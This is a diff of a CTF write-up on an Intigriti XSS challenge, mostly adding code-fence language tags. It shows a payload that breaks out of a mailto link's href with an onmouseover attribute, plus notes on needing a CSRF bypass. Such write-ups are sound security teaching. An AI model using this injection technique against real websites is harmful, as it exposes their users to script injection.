@@ -55,7 +55,7 @@ Break down the source in different steps:
   - one more interesting thing to note is the comment `<!-- page generated at 2021-04-02 09:36:09 --> ` at the bottom of the page
 
 Changing the note and clicking on save will send a POST request and updated note will be reflected on the page
-```
+```html
 POST / HTTP/1.1
 Host: challenge-0321.intigriti.io
 Connection: close
@@ -65,7 +65,7 @@ Cookie: PHPSESSID=46c7eeb13d285bc57ef010c799372735
 csrf=36cd9b23b082ae06c73c73e79a6dc64f&notes=No+notes+saved
 ```
 If we add  special character like <> , & these were being html escaped in the response from the server, however charaters like !, #, $, @, ^,*,(,),',"  were not html escaped
-```
+```html
 POST / HTTP/1.1
 Host: challenge-0321.intigriti.io
 Cookie: PHPSESSID=46c7eeb13d285bc57ef010c799372735
@@ -86,7 +86,7 @@ Response
 ```
 
 One interesting transformation of response occure while updating note-display to an url or email
-```
+```html
 POST / HTTP/1.1
 Host: challenge-0321.intigriti.io
 Cookie: PHPSESSID=46c7eeb13d285bc57ef010c799372735
@@ -115,18 +115,27 @@ Doing a simple google search with the text xss email payload , first result is h
 ![image](https://user-images.githubusercontent.com/19681324/113426701-79839500-93f1-11eb-8a37-c33d39ec712b.png)
 
 but <> characters are escaped by the server side
-```
+```html
 <a href="mailto:"&lt;svg/onload=alert(1)&gt;"@x.y">"&lt;svg/onload=alert(1)&gt;"@x.y</a>
 ```
 however " are not escaped, as we can see avobe we came out of href attribute. So changing the payload slightly to `"onmouseover=alert('flag{THIS_IS_THE_FLAG}');"@x.y` we get a response like this
-```
+```html
 <p id="notes-display" class="card-content" contenteditable="true">
 <a href="mailto:"onmouseover=alert('flag{THIS_IS_THE_FLAG}');"@x.y">"onmouseover=alert('flag{THIS_IS_THE_FLAG}');"@x.y</a>
 ```
 which gets us an alert 
 ![image](https://user-images.githubusercontent.com/19681324/113427645-0a0ea500-93f3-11eb-93b3-9571e871e645.png)
 
+It's not solved yet, as mentioned in the solution section of the CTF self-xss are not allowed. so we have to trick someone into clicking a link and triggering the xss. but there is one problem. There is CSRF protection. Using an invalid csrf token gives us a 403 forbidden response and csrf token changes each time we send a request to the server
+```html
+HTTP/1.1 403 Forbidden
+Server: nginx/1.17.10
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+```
 
+CSRF Bypass
+-----------
 
 
 
